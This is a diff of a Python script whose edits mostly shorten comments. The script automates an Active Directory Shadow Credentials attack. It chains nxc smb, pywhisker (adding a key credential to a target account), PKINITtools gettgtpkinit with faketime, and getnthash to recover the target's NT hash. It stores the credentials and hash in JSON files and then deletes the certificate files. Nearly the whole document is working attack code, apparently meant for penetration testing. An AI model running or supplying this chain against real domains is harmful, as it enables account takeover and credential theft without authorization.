@@ -5,7 +5,7 @@ import os
 import json
 import glob
 
-# Run a command and return stdout + stderr
+# Return stdout + stderr
 def run_cmd(cmd):
     print(f"Running: {cmd}")
     result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
@@ -63,13 +63,13 @@ def main():
     if not os.path.exists(creds_dir):
         os.makedirs(creds_dir)
 
-    # Step 0: run nxc smb to generate hosts file
+    # NXC
     hosts_file = "host_script"
     nxc_cmd = f"nxc smb {args.dc} --generate-hosts-file {hosts_file}"
     run_cmd(nxc_cmd)
     print(f"[+] Hosts file generated: {hosts_file}")
 
-    # Save initial credentials immediately after hosts_file generation
+    # Save credentials after hosts_file generation
     cred_file = os.path.join(creds_dir, f"{args.target}_initial.json")
     data = {
         "username": args.user,
@@ -83,11 +83,10 @@ def main():
         json.dump(data, f, indent=4)
     print(f"[+] Initial credentials saved in {cred_file}")
 
-    # Step 1: run pywhisker
+    # Pywhisker
     pywhisker_cmd = f'python3 pywhisker.py -d "{args.domain}" -u "{args.user}" -p "{args.password}" --target "{args.target}" --action "add"'
     pywhisker_output = run_cmd(pywhisker_cmd)
 
-    # Extract PFX file and password
     pfx_file, pfx_pass = parse_pywhisker_output(pywhisker_output)
     if not pfx_file or not pfx_pass:
         print("[-] Could not extract PFX or password from pywhisker output!")
@@ -95,15 +94,14 @@ def main():
     print(f"[+] Found PFX: {pfx_file}")
     print(f"[+] Found password: {pfx_pass}")
 
-    # Save PFX info in creds
     data.update({"pfx_file": pfx_file, "pfx_pass": pfx_pass})
     with open(cred_file, "w") as f:
         json.dump(data, f, indent=4)
 
-    # Build faketime
+    # Faketime
     faketime_cmd = f'$(ntpdate -q {args.dc} | cut -d " " -f 1,2)'
 
-    # Step 2: run gettgtpkinit and obtain TGT
+    # Gettgtpkinit -> TGT
     gettgt_cmd = f'faketime "{faketime_cmd}" python3 PKINITtools/gettgtpkinit.py -cert-pfx {pfx_file} {args.domain}/{args.target} -pfx-pass "{pfx_pass}" {args.target}.ccache'
     gettgt_output = run_cmd(gettgt_cmd)
 
@@ -124,23 +122,23 @@ def main():
         os.environ["KRB5CCNAME"] = args.exp
         print(f"[+] Set KRB5CCNAME to {os.environ['KRB5CCNAME']}")
 
-    # Step 3: run getnthash.py using AS-REP key and target
+    # Ggetnthash.py using AS-REP key and target
     getnthash_cmd = f'faketime "{faketime_cmd}" python3 PKINITtools/getnthash.py -key {asrep_key} {args.domain}/{args.target}'
     nthash_output = run_cmd(getnthash_cmd)
 
-    # Extract NT hash
+    # NT hash
     nt_hash = parse_nthash(nthash_output)
     if not nt_hash:
         print("[-] Could not extract NT hash!")
         return
     print(f"[+] Found NT hash: {nt_hash}")
 
-    # Save NT hash in creds
+    # Save NT hash
     data.update({"nt_hash": nt_hash})
     with open(cred_file, "w") as f:
         json.dump(data, f, indent=4)
 
-    # Step 4: Cleanup - remove temporary files
+    # Cleanup - remove temporary files
     for ext in ["*.bak", "*.pem", "*.pfx"]:
         for file in glob.glob(ext):
             try:
